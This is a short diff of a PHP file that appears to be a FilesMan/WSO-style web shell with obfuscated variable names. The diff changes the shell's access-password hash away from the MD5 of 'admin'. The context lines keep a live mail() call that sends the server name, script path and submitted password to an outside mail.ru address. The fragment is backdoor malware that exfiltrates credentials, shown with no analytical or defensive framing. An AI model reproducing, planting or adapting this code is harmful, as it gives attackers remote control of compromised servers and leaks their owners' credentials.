@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
+$▛ = "13e8f3a87bec4168dd3697f5d2dcff77";
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
